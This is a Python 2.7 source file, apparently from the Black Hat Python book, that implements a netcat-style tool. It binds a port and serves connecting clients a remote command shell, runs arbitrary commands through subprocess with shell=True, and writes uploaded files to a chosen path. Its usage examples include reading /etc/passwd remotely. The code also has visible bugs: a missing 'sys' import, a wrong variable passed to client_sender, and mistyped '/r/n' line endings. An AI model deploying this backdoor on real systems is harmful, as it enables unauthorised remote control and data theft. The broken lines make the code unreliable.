#!/usr/bin/python2.7

"""
bhpnet.py

Code sample from https://nostarch.com/blackhatpython
Forked from https://github.com/WillPennell/Python

@author Will Pennel
@author Don Taylor

@updated: March 17, 2019
"""
import socket
import multiprocessing
import subprocess

# declare and initialize global vars
LISTEN = False
COMMAND = False
UPLOAD = False
EXECUTE = ""
TARGET = ""
UPLOAD_DESTINATION = ""
PORT = 0


def client_sender(buf):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((TARGET, PORT))
        
        if len(buf):
            client.send(buf)
            
        while True:
            # now wait for data back
            recv_len = 1
            response = ""
            
            while recv_len:
                data = client.recv(4096)          
                recv_len = len(data)
                response += data
            
                if recv_len < 4096:
                    break
            print response,
        
            # wait for more input
            buf = raw_input("")
            buf += "\n"
        
            # send it off
            client.send(buf)
    
    except socket.error:
        print "[*] Exception! Exiting."
        
        # tear down the connection
        client.close()
        

def server_loop():

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((TARGET, PORT))
    server.listen(5)
    
    while True:
        client_socket, addr = server.accept()
        
        # spin off a new process to handle the client
        client_process = multiprocessing.Process(target=client_handler, args=(client_socket,))
        client_process.start()


def run_command(command):
    # trim the newline of whitespace
    command = command.rstrip()
    
    # run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError:
        output = "[-] Failed to execute command\r\n"
        
    # send the output back to the client
    return output


def client_handler(client_socket):

    # check for upload
    if len(UPLOAD_DESTINATION):
        
        # read in all the bytes of the file and write to our destination
        file_buffer = ""
        
        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024)
            
            if not data:
                break
            else:
                file_buffer += data
        
        # now we take these bytes and write them out
        try: 
            file_descriptor = open(UPLOAD_DESTINATION, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            # acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s/r/n" % UPLOAD_DESTINATION)
        except IOError:
            client_socket.send("Failed to save file to %s/r/n" % UPLOAD_DESTINATION)
            
    # check for command execution
    if len(EXECUTE):
        
        # run the command
        output = run_command(EXECUTE)
        
        client_socket.send(output)
        
    # now we go into another loop if a command shell was requested
    
    if COMMAND:
        while True:
            # show a simple prompt
            client_socket.send("<BHP:#> ")
            
            # now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            
            # we have a valid command so execute it and send back the results
            response = run_command(cmd_buffer)
            
            # send the response back to the client
            client_socket.send(response)


def main():

    # are we going to listen or just send data from stdin?
    if not LISTEN and len(TARGET) and PORT > 0:
            
        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input
        # to stdin
            
        buf = sys.stdin.read()
            
        print "sending data"
        # send data off
        client_sender(buffer)
            
    # we are going to listen and potentially 
    # upload things, execute commands, and drop a shell back 
    # depending on our command line options above
    if LISTEN:
        server_loop()


if __name__ == '__main__':
    from argparse import ArgumentParser
    description = """
    BHP Net Tool
    Usage: bhpnet.py -t target_host -p port
    
    Examples: 
    bhpnet.py -t 192.168.0.1 -p 5555 -l -c
    bhpnet.py -t 192.168.0.1 -p 5555 -l -u C:\\target.exe
    bhpnet.py -t 192.168.0.1 -p 5555 -l -e \"cat /etc/passwd\"
    echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135
    """
    parser = ArgumentParser(description=description)
    parser.add_argument('-t', dest='host', default='0.0.0.0')
    parser.add_argument('-p', dest='port', default=0, type=int)
    parser.add_argument('-l', '--listen', dest='listen', default=False, action='store_true',
                        help='listen for incoming connections')
    parser.add_argument('-e', '--execute', dest='execute', default='',
                        help='execute the given file upon receiving a connection')
    parser.add_argument('-c', '--command', dest='command', default=False, action='store_true',
                        help='initialize a command shell')
    parser.add_argument('-u', '--upload', dest='upload', default='',
                        help='upon receiving a connection upload a file and write to [destination]')
    args = parser.parse_args()

    TARGET = args.host
    PORT = args.port
    LISTEN = args.listen
    EXECUTE = args.execute
    COMMAND = args.command
    UPLOAD_DESTINATION = args.upload
    main()
        
        



                                    

